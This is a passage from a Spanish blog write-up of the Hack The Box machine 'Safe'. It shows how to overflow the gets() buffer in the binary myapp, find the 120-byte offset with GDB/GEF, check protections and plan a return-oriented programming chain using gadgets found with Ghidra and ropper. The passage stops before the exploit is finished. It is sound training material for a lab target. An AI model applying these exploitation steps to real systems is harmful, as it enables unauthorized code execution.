&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;python &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;print &quot;A&quot;*365&apos;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2021-12-27-Safe-Hack-The-Box/10.png&quot; alt=&quot;10&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Si nos percatamos, al introducir nuestra cadena de &lt;em&gt;365 letras A&lt;/em&gt;, el binario &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;myapp&lt;/code&gt;, deja de funcionar como debería, esto se debe a un &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Segmentation Fault&lt;/code&gt; (&lt;em&gt;Fallo de Segmentación&lt;/em&gt;), los cuales se dan cuando empezamos a sobrescribir registros. Ahora, ¿por qué se están sobrescribiendo algunos registros?&lt;/p&gt;

&lt;p&gt;Cuando el programa &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;myapp&lt;/code&gt;, nos pregunta por una cadena de caracteres, este almacena nuestra respuesta en un bloque de memoria, el &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;buffer&lt;/code&gt;, el cual puede almacenar una cierta cantidad de bytes, la cual de momento desconocemos; si introducimos una cantidad de bytes mayor a la que el buffer estaba diseñado, el programa corrompe.&lt;/p&gt;

&lt;p&gt;La pregunta ahora es, ¿a dónde se dirigen estos bytes que están desbordando el &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;buffer&lt;/code&gt;, acaso desaparecen? La respuesta es no, como mencioné, empezamos a sobrescribir registros, de modo que los bytes siguientes a la cantidad máxima de bytes que soporta el buffer, se dirigen al siguiente valor de memoria, y así sucesivamente.&lt;/p&gt;

&lt;p&gt;El concepto de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Buffer Overflow&lt;/code&gt; puede parecer complejo en un inicio, pero es mucho más fácil de asimilarlo cuando lo visualizamos; para ello, haremos uso de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GDB&lt;/code&gt;, herramienta que nos permitirá depurar el binario &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;myapp&lt;/code&gt;. Concretamente estaré haciendo uso de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GEF&lt;/code&gt; (&lt;em&gt;GDB Enhanced Features&lt;/em&gt;), el cual es una extensión para GDB, así como lo es &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PEDA&lt;/code&gt; (&lt;em&gt;Python Exploit Development Assistance&lt;/em&gt;).&lt;/p&gt;

&lt;p&gt;Si queremos instalar &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GEF&lt;/code&gt;, podemos seguir las instrucciones dadas por la &lt;a href=&quot;https://gef.readthedocs.io/en/main/#setup&quot;&gt;página oficial&lt;/a&gt;, no obstante, en mi caso, esto no me funcionó, por lo que tuve que realizar lo siguiente:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;pip3 install capstone unicorn keystone-engine ropper

wget https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2021-12-27-Safe-Hack-The-Box/gefInstall.sh
chmod 744 gefInstall.sh
./gefInstall.sh
rm gefInstall.sh
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Ya con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GEF&lt;/code&gt; instalado podemos empezar a depurar el binario &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;myapp&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gdb myapp

run
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2021-12-27-Safe-Hack-The-Box/11.png&quot; alt=&quot;11&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2021-12-27-Safe-Hack-The-Box/12.png&quot; alt=&quot;12&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Algo importante a mencionar, antes de empezar el análisis con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GEF&lt;/code&gt;, es que la arquitectura del sistema ante el que nos estamos enfrentando a la hora de explotar &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Buffer Overflow&lt;/code&gt;, tiene bastante relevancia; en este caso concreto, nos estamos enfrentando ante una máquina de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;64 bits&lt;/code&gt;, y esto lo podemos saber ya que el nombre de los registros empieza por ‘R’ (&lt;em&gt;RBP, RSP, RIP&lt;/em&gt;), en caso de que el sistema fuera de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;32 bits&lt;/code&gt;, el nombre de los registros empezaría por ‘E’ (&lt;em&gt;EBP, ESP, EIP&lt;/em&gt;), no obstante, independientemente de la arquitectura, estos registros se refieren a lo mismo.&lt;/p&gt;

&lt;p&gt;Para explotar un &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Buffer Overflow&lt;/code&gt; satisfactoriamente, existen dos requisitos indispensables, el primero es sobrescribir el registro &lt;em&gt;RIP&lt;/em&gt; o &lt;em&gt;EIP&lt;/em&gt; (según corresponda), ya que este, apunta a la dirección siguiente a ejecutar, por lo que nos interesa como atacantes redirigir el flujo del programa a nuestro antojo, cabe aclarar que la dirección introducida debe de existir dentro del programa, caso contrario, este corromperá como lo está haciendo ahora mismo; el segundo requisito se refiere a, de qué manera vamos a sobrescribir el registro &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RIP&lt;/code&gt;, para ello debemos calcular su &lt;em&gt;offset&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;Sobre el mensaje &lt;em&gt;Cannot disassemble from $PC&lt;/em&gt;, veremos una pequeña flecha que nos indica en que sección, el programa dejó de funcionar, en este caso es en una función de retorno que apunta hacia el registro &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RSP&lt;/code&gt;, el cual, si nos percatamos, está lleno de &lt;em&gt;letras A&lt;/em&gt;; nuestro objetivo ahora es, determinar después de cuántos bytes, empezaremos a sobrescribir el registro &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RSP&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Haciendo uso de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GEF&lt;/code&gt;, esto es bastante sencillo, ya que lo hará por nosotros, por lo que debemos realizar lo siguiente:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gdb myapp

pattern create
run
pattern offset $rsp
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2021-12-27-Safe-Hack-The-Box/13.png&quot; alt=&quot;13&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2021-12-27-Safe-Hack-The-Box/14.png&quot; alt=&quot;14&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Sabemos ahora que, después de ingresar &lt;em&gt;120 bytes&lt;/em&gt;, empezaremos a sobrescribir el registro &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RSP&lt;/code&gt;, y esto lo podemos comprobar de manera sencilla, intentando ingresar en este registro, &lt;em&gt;8 letras B&lt;/em&gt;, por ejemplo.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;python &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;print &quot;A&quot;*120 + &quot;B&quot;*8&apos;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gdb myapp

run
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2021-12-27-Safe-Hack-The-Box/15.png&quot; alt=&quot;15&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2021-12-27-Safe-Hack-The-Box/16.png&quot; alt=&quot;16&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;En efecto, al ingresar &lt;em&gt;120 bytes&lt;/em&gt;, empezamos a sobrescribir el &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RSP&lt;/code&gt;, ya con esto en mente, debemos verificar que estándares de seguridad se están aplicando sobre el binario, para así determinar que metodología emplearemos para explotarlo; para conocer que seguridades se están aplicando, haremos uso de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;checksec&lt;/code&gt;, esto podemos hacerlo tanto dentro de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GEF&lt;/code&gt;, como fuera de él.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gdb myapp

checksec
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2021-12-27-Safe-Hack-The-Box/17.png&quot; alt=&quot;17&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;checksec myapp
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2021-12-27-Safe-Hack-The-Box/18.png&quot; alt=&quot;18&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Podemos observar que el &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DEP&lt;/code&gt; (&lt;em&gt;Data Execution Prevention&lt;/em&gt;), o &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;NX&lt;/code&gt; (&lt;em&gt;No-Execute&lt;/em&gt;), está activado; esta protección nos impedirá ejecutar código a través del &lt;em&gt;stack&lt;/em&gt;, por lo que no tendrá sentido redirigir el flujo del programa por ahí, por lo que debemos ver, de qué manera, haciendo uso de las mismas posibilidades que nos ofrece el binario &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;myapp&lt;/code&gt;, podemos explotarlo, a este concepto se lo conoce como &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ROP&lt;/code&gt; (&lt;em&gt;Return Oriented Programming&lt;/em&gt;).&lt;/p&gt;

&lt;p&gt;Ya en este punto, sabido lo que tenemos que hacer, podemos empezar a aplicar &lt;em&gt;ingeniería inversa&lt;/em&gt; sobre el binario, para hacerlo, haremos uso de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Ghidra&lt;/code&gt;, una suite de herramientas dedicada a la &lt;em&gt;ingeniería inversa&lt;/em&gt;, desarrollada por la &lt;em&gt;NSA&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;Para descargar &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Ghidra&lt;/code&gt;, ingresaremos &lt;a href=&quot;https://github.com/NationalSecurityAgency/ghidra/releases&quot;&gt;aquí&lt;/a&gt;, y descargaremos la versión más reciente.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2021-12-27-Safe-Hack-The-Box/19.png&quot; alt=&quot;19&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;unzip &amp;lt;archivoQueHayamosDescargado&amp;gt;
cd &amp;lt;carpetaQueSeHayaCreado&amp;gt;
./ghidraRun
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Presionaremos &lt;em&gt;File&lt;/em&gt;, &lt;em&gt;New Project&lt;/em&gt;, &lt;em&gt;Non-Shared Project&lt;/em&gt;, elegiremos un espacio de trabajo, le damos un nombre a nuestro proyecto, presionamos &lt;em&gt;File&lt;/em&gt;, &lt;em&gt;Import File&lt;/em&gt;, seleccionamos el binario &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;myapp&lt;/code&gt;, arrastramos el binario que acabamos de importar hacia el dragón, y finalmente aceptamos analizar.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2021-12-27-Safe-Hack-The-Box/20.png&quot; alt=&quot;20&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ya en este punto podemos empezar a analizar que hay dentro del binario &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;myapp&lt;/code&gt;, por ejemplo, podemos analizar que funciones están definidas, para ello, desplegaremos el menú &lt;em&gt;Functions&lt;/em&gt;, que se encuentra al lado izquierdo, podemos empezar por analizar la función &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;main&lt;/code&gt;.
&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2021-12-27-Safe-Hack-The-Box/21.png&quot; alt=&quot;21&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Si nos percatamos, esto es lo que encontramos cuando ejecutamos &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;myapp&lt;/code&gt;; nos damos cuenta de que se está definiendo una variable de nombre &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;local_78&lt;/code&gt; que acepta una cierta cantidad de bytes, concretamente, 112, la cual almacena la cadena de caracteres que nos pide ingresar, para posteriormente, volver a mostrarla por pantalla, adicionalmente, se está ejecutando una llamada al sistema para ejecutar el comando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;uptime&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Podemos observar dos cosas interesantes, por un lado, se está haciendo uso de la función &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gets()&lt;/code&gt;, una función considerada insegura, debido principalmente a que esta, no verifica la longitud del buffer, razón por la cual, podemos desbordarlo. Por otra parte, nos damos cuenta de que se está haciendo una llamada al sistema, algo que llama nuestra atención, ya que si lográramos introducir un comando diferente a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;uptime&lt;/code&gt;, podríamos conseguir una consola dentro de la máquina víctima.&lt;/p&gt;

&lt;p&gt;Pero, ¿cómo introducimos un comando si el programa ya está compilado? La respuesta está en la función &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;test&lt;/code&gt;, y el concepto de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ROP&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;No obstante, vamos a analizar el binario &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;myapp&lt;/code&gt;, una vez más, con la diferencia de que vamos a empezar a automatizar lo que vamos a hacer, pues ya tenemos una idea clara de por donde van los tiros. Para ello, podemos crear un script en &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Python&lt;/code&gt;, para lo cual empezaremos por colocar la cabecera de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Python 3&lt;/code&gt;, importar la librería &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pwntools&lt;/code&gt;, y definir tanto la &lt;em&gt;arquitectura&lt;/em&gt; como el &lt;em&gt;sistema operativo&lt;/em&gt; de la máquina víctima, adicionalmente, podemos definir que tipo de terminal queremos emplear para poder trabajar más a gusto.&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;#!/usr/bin/python3
&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;terminal&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;gnome-terminal&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;-x&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;arch&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;amd64&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;os&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;linux&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;En caso de no contar con la librería &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pwntools&lt;/code&gt;, podemos hacer lo siguiente:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;apt-get install python3 python3-pip python3-dev git libssl-dev libffi-dev build-essential
python3 -m pip install --upgrade pip
python3 -m pip install --upgrade pwntools
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Una vez definida la base del script, podemos empezar a trabajar. Nos interesa saber en que registro, se está almacenando el comando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;uptime&lt;/code&gt;, para lo cual, empezaremos por definir un proceso, el cual será la depuración del binario, añadiremos un &lt;em&gt;breakpoint&lt;/em&gt; en la dirección donde se hace la llamada al sistema, y, adicional a ello, indicaremos al script que nos espere hasta escribir algo después de &lt;em&gt;What do you want me to echo back?&lt;/em&gt;, caso contrario, el script se cerrará.&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;gdb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;debug&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;/ubicación/del/binario/myapp&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;b *0x40116e&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;recvuntil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;What do you want me to echo back?&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;La dirección de la llamada al sistema, la podemos sacar de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Ghidra&lt;/code&gt;:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2021-12-27-Safe-Hack-The-Box/22.png&quot; alt=&quot;22&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ejecutamos nuestro script, no sin antes haberle asignado los permisos correspondientes:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;chmod 744 &amp;lt;nuestroScript.py&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;En este punto podemos presionar la tecla &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;c&lt;/code&gt;, para continuar, y nos daremos cuenta que el comando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;uptime&lt;/code&gt;, está siendo almacenado en el registro &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RDI&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2021-12-27-Safe-Hack-The-Box/23.png&quot; alt=&quot;23&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;En este punto, tenemos que buscar una forma de sobrescribir el registro &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RDI&lt;/code&gt;, y la clave está en la función &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;test&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2021-12-27-Safe-Hack-The-Box/24.png&quot; alt=&quot;24&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Si nos percatamos, en la dirección &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x401156&lt;/code&gt;, el contenido que se encuentra en el registro &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RSP&lt;/code&gt;, está siendo almacenado en el registro &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RDI&lt;/code&gt;; ¿cuándo almacenábamos las &lt;em&gt;8 letras B&lt;/em&gt;, en qué registro las estábamos almacenando? Exacto, en &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RSP&lt;/code&gt;, por lo que ahora, debemos de buscar una forma en la que poder redirigir el flujo del programa a través de la función &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;test&lt;/code&gt;, para que cuando esta termine, podamos ejecutar el comando que deseemos.&lt;/p&gt;

&lt;p&gt;Sin embargo, hay un pequeño problema, en la siguiente instrucción, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x401159&lt;/code&gt;, se está efectuando un &lt;em&gt;jump&lt;/em&gt; a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;R13&lt;/code&gt;, el cual apunta a una dirección que no nos interesa, por lo que también debemos de hallar una forma en la que inyectar la dirección en la que se efectúa la llamada al sistema, de modo que así, a la llamada al sistema, le estamos pasando como argumento nuestro código malicioso definido en &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RDI&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;La pregunta ahora es, ¿de qué manera inyectamos la dirección de la llamada al sistema, en &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;R13&lt;/code&gt;? Esto lo haremos haciendo uso de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gadgets&lt;/code&gt;, los cuales no son más que instrucciones de la CPU, ya definidas dentro del programa.&lt;/p&gt;

&lt;p&gt;Haciendo uso de nuestro script, escribiremos ahora &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ropper&lt;/code&gt;, lo cual nos permitirá listar todos los &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gadgets&lt;/code&gt; dentro del binario.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2021-12-27-Safe-Hack-The-Box/25.png&quot; alt=&quot;25&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Vemos que se nos lista un total de &lt;em&gt;99 gadgets&lt;/em&gt;, de los cuales nos interesa &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pop&lt;/code&gt;, ya que este nos permite cargar un valor en el registro al que esté asignado, por lo que procederemos a listar que opciones tenemos con el &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gadget pop&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ropper --search &quot;pop&quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2021-12-27-Safe-Hack-The-Box/26.png&quot; alt=&quot;26&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Observamos, que tenemos una opción que nos permite hacer un &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pop&lt;/code&gt; a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;R13&lt;/code&gt;, aunque esta va seguida de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pops&lt;/code&gt; a otras direcciones, por lo que a estas, tendremos que asignarles valores nulos, ya que no nos interesan.&lt;/p&gt;

